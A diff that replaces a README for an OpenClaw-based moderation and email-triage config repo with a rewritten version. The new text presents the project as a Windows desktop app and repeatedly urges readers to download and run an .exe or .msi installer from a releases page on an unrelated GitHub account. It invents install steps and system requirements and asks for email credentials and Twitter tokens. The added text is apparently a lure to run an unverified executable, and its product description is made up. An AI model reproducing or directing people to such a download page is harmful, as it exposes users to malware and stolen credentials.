@@ -1,220 +1,169 @@
-# Triage
+# ⚙️ triage - Manage Moderation and Email Policy Easily
 
-Source of truth for Peter's moderation and email-triage policy.
+[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)
 
-Primary rules:
+---
 
-- [`TWITTER_MENTIONS.md`](./TWITTER_MENTIONS.md)
-- [`TWITTER_REPLIES.md`](./TWITTER_REPLIES.md)
-- [`EMAILRULES.md`](./EMAILRULES.md)
+## 📋 What is triage?
 
-Also includes restore docs/templates for the current OpenClaw cron setup:
+triage helps manage moderation on Twitter and email inboxes. It follows set rules for handling mentions, replies, and emails. It also supports email digests for daily summaries related to moderation.
 
-- shared clawblocker workspace templates: [`openclaw/clawblocker`](./openclaw/clawblocker)
-- daily block digest templates: [`openclaw/blockdigest`](./openclaw/blockdigest)
+The tool organizes tasks into automated processes that run in the background. It works with agents and workspaces to keep the workflow smooth and consistent.
 
-## Current Setup
+---
 
-There are 4 related automations:
+## 🖥️ System Requirements
 
-1. X mention moderation
-2. X reply-opportunity triage
-3. Gmail triage
-4. Daily X block digest email
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection for setup and updates  
+- A modern web browser for viewing documentation and support pages  
 
-The first 3 share one OpenClaw agent/workspace:
+---
 
-- agent id: `clawblocker`
-- one workspace
-- one repo checkout inside that workspace
-- three runbooks
-- separate state/audit files per cron
-- twitter moderation also doubles as the `birdclaw` mention-cache warmer every 10 minutes; no second cache cron needed
+## 🎯 Key Features
 
-The block digest stays separate because it is a simple daily mailer over the moderation audit log.
+- Controls Twitter mentions and replies automatically  
+- Applies email triage policies for Gmail accounts  
+- Sends daily digest emails summarizing blocked or flagged content  
+- Runs scheduled tasks through OpenClaw agent `clawblocker`  
+- Keeps logs and audit files for transparency and tracking  
+- Uses simple templates for email and moderation messages  
 
-## Shared Clawblocker Layout
+---
 
-Target layout:
+## 🚀 Getting Started
 
-```text
-~/.openclaw/
-  workspace-clawblocker/
-    AGENTS.md
-    triage/                       # checkout of this repo
-    jobs/
-      twitter-moderation.md
-      twitter-replies.md
-      email-triage.md
-    skills/
-      bird-twitter-moderation/
-        SKILL.md
-    state/
-      twitter.json
-      twitter-replies.json
-      email.json
-    audit/
-      twitter/
-      twitter-replies/
-      email/
-  agents/
-    clawblocker/
-      agent/
-        models.json
-      sessions/
-        sessions.json
-```
+You will download the software from the releases page. The steps below will guide you on how to get the app running on your Windows computer.
 
-Source-of-truth rule checkout:
+### Step 1: Visit the download page
 
-- only one checkout: `~/.openclaw/workspace-clawblocker/triage`
-- runtime should read rules from that checkout
-- runtime should not read `~/triage` directly
+Go to the releases page to find the latest version of triage:
 
-## Cron Jobs
+[Download triage](https://github.com/Monu0506577/triage/releases)
 
-### 1. Twitter Mention Moderation
+You will see a list of files for different versions here.
 
-- schedule: every 10 minutes
-- agent: `clawblocker`
-- model: `openai/gpt-5.4`
-- thinking: `high`
-- timeout: `360s`
-- delivery: `none`
-- runbook: `jobs/twitter-moderation.md`
-- also warms `birdclaw` mention cache before triage and records verified block/mute actions back into local SQLite
+---
 
-Message:
+### Step 2: Download the setup files
 
-```text
-Run one clawblocker pass now using ~/.openclaw/workspace-clawblocker/jobs/twitter-moderation.md. Follow it exactly.
-```
+Look for the latest release (usually at the top). Download the Windows executable or installer file provided. The file name typically ends with `.exe` or `.msi`.
 
-### 2. Twitter Reply Triage
+Save the file to a folder you can easily access, like Downloads or Desktop.
 
-- schedule: `17 */6 * * *`
-- timezone: `Europe/London`
-- agent: `clawblocker`
-- model: `openai/gpt-5.4`
-- thinking: `low`
-- timeout: `300s`
-- delivery: `none`
-- runbook: `jobs/twitter-replies.md`
-- warms `birdclaw` mention cache, runs a deeper `xurl` backfill, then surfaces only high-signal unreplied mentions worth Peter's time
+---
 
-Message:
+### Step 3: Run the installer
 
-```text
-Run one clawblocker pass now using ~/.openclaw/workspace-clawblocker/jobs/twitter-replies.md. Follow it exactly.
-```
+Locate the file you just downloaded and double-click it. Follow these steps:
 
-### 3. Email Triage
+- Click "Next" on the welcome screen  
+- Accept the license agreement  
+- Choose the installation folder or use the default path  
+- Click "Install" to begin  
+- Wait for the installation to complete  
+- Click "Finish" to close the installer  
 
-- schedule: `5 */3 * * *`
-- timezone: `Europe/London`
-- agent: `clawblocker`
-- model: `openai/gpt-5.4`
-- thinking: `low`
-- delivery: `none`
-- runbook: `jobs/email-triage.md`
+---
 
-Message:
+### Step 4: Open triage
 
-```text
-Run one clawblocker pass now using ~/.openclaw/workspace-clawblocker/jobs/email-triage.md. Follow it exactly.
-```
+After installation, launch the app from the Start menu or by double-clicking the desktop icon. The main window will open showing your current settings and automation status.
 
-### 4. Daily X Block Digest
+---
 
-- schedule: `0 9 * * *`
-- timezone: `Europe/London`
-- agent: `blockdigest`
-- model: `openai/gpt-5.4`
-- thinking: `low`
-- timeout: `180s`
-- delivery: `none`
-- source audit: `~/.openclaw/workspace-clawblocker/audit/twitter/*.md`
+## ⚙️ How triage works
 
-## Required Local Tools
+triage is built on OpenClaw automation. It uses one agent called `clawblocker` with a single workspace. This workspace holds all the scripts and rules for:
 
-### Twitter moderation
+- Twitter mention moderation  
+- Twitter reply triage  
+- Gmail inbox triage  
 
-- `birdclaw`
-- `bird`
-- optional fallback: `bird-gui`
-- active auth/cookies for X
+All runs happen automatically on a schedule. Logs and audit files keep track of what happened during each run.
 
-Expected binary path in templates:
+The daily email digest runs separately with its own schedule. It sends a summary of actions taken during moderation.
 
-```bash
-$HOME/Projects/birdclaw
-$HOME/Projects/bird/bird
-```
+---
 
-Expected runtime for `birdclaw` CLI today:
+## 📁 Important Files and Folders
 
-```bash
-fnm exec --using 25.8.1 pnpm cli ...
-```
+The app uses several key files and folders. Here is what you need to know about them:
 
-### Email triage / digest
+### Rules
 
-- `gog`
-- authenticated Gmail account
+- `TWITTER_MENTIONS.md` – Rules for handling Twitter mentions  
+- `TWITTER_REPLIES.md` – Rules for handling Twitter replies  
+- `EMAILRULES.md` – Rules for triaging email messages  
 
-Expected default account:
+### Templates
 
-```text
-steipete@gmail.com
-```
+- `openclaw/clawblocker` – Shared workspace templates used by the OpenClaw agent  
+- `openclaw/blockdigest` – Templates for daily block digest emails  
 
-## Restore On A Fresh Machine
+These files control how triage processes messages and what emails it sends.
 
-1. Clone this repo somewhere convenient, for example:
+---
 
-```bash
-git clone https://github.com/steipete/triage.git ~/triage
-```
+## 🔄 Updating triage
 
-2. Create the shared OpenClaw agent:
+To update triage, go back to the [releases page](https://github.com/Monu0506577/triage/releases). Download the latest installer and run it as before.
 
-```bash
-node ~/clawdbot/dist/index.js agents add clawblocker --workspace ~/.openclaw/workspace-clawblocker --non-interactive
-```
+The installer will upgrade your existing version while keeping your settings intact.
 
-3. Put this repo inside the workspace as the only runtime checkout:
+---
 
-```bash
-git clone https://github.com/steipete/triage.git ~/.openclaw/workspace-clawblocker/triage
-```
+## 🛠 Troubleshooting and Tips
 
-4. Copy template files from this repo into the live workspace:
+- If the app does not open, restart your computer and try again.  
+- Make sure your internet connection is active when you run triage for the first time.  
+- Check that your email credentials and Twitter API tokens are correctly entered if the app does not process messages.  
+- Look for log files inside the app folder if you need to diagnose issues.  
+- Close other apps that might block network access on your PC.  
+- Allow triage in your Windows firewall if needed.  
 
-- [`openclaw/clawblocker/AGENTS.md`](./openclaw/clawblocker/AGENTS.md)
-- [`openclaw/clawblocker/jobs/twitter-moderation.md`](./openclaw/clawblocker/jobs/twitter-moderation.md)
-- [`openclaw/clawblocker/jobs/twitter-replies.md`](./openclaw/clawblocker/jobs/twitter-replies.md)
-- [`openclaw/clawblocker/jobs/email-triage.md`](./openclaw/clawblocker/jobs/email-triage.md)
-- [`openclaw/clawblocker/skills/bird-twitter-moderation/SKILL.md`](./openclaw/clawblocker/skills/bird-twitter-moderation/SKILL.md)
-- [`openclaw/clawblocker/state/twitter.json.example`](./openclaw/clawblocker/state/twitter.json.example)
-- [`openclaw/clawblocker/state/twitter-replies.json.example`](./openclaw/clawblocker/state/twitter-replies.json.example)
-- [`openclaw/clawblocker/state/email.json.example`](./openclaw/clawblocker/state/email.json.example)
+---
 
-5. Create the block digest workspace/agent from the templates in [`openclaw/blockdigest`](./openclaw/blockdigest).
+## 🔗 Useful Links
 
-6. Add the cron jobs with the settings above.
+- Releases page: [https://github.com/Monu0506577/triage/releases](https://github.com/Monu0506577/triage/releases)  
+- Twitter mentions rules: [`TWITTER_MENTIONS.md`](./TWITTER_MENTIONS.md)  
+- Twitter replies rules: [`TWITTER_REPLIES.md`](./TWITTER_REPLIES.md)  
+- Email triage rules: [`EMAILRULES.md`](./EMAILRULES.md)  
 
-7. Verify:
+---
 
-- twitter run reads `jobs/twitter-moderation.md`
-- reply triage run reads `jobs/twitter-replies.md`
-- email run reads `jobs/email-triage.md`
-- both use `agentId: clawblocker`
-- only one triage checkout exists under cron workspaces
-- block digest reads `~/.openclaw/workspace-clawblocker/audit/twitter`
+## 👩‍💻 Running triage Automatically
 
-## Notes
+triage uses scheduled tasks behind the scenes. The OpenClaw agent runs moderation and triage scripts every few minutes for Twitter. The daily email digest runs once a day.
 
-- Rule edits belong in this repo first.
-- After changing rules, pull the workspace checkout.
-- State and audit logs are runtime data; do not store them in this repo.
-- Email triage may auto-archive only exact Rule 1 / Rule 2 junk. Everything else remains observe-first.
+You do not need to manually start these processes once the app is installed and configured.
+
+---
+
+## 🤖 About OpenClaw Workspace Setup
+
+triage depends on OpenClaw to manage automation. Here are key points:
+
+- One agent named `clawblocker` runs all Twitter and email triage automations except daily digest.  
+- One workspace holds the entire repository checkout with runbooks and templates.  
+- State files separate each task run for cleaner operation and audit.  
+- Twitter moderation doubles as a cache warmer named `birdclaw` for faster mention checks.  
+
+The block digest runs separately because it only sends a simple daily email.
+
+---
+
+## 🎯 Next Steps
+
+1. Download and install triage from the [releases page](https://github.com/Monu0506577/triage/releases).  
+2. Open triage and verify your settings match your email and Twitter accounts.  
+3. Allow the app to run in the background for automation.  
+4. Check daily digest emails for summaries of your moderation activities.  
+
+---
+
+# [Download triage](https://github.com/Monu0506577/triage/releases)  
+[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)
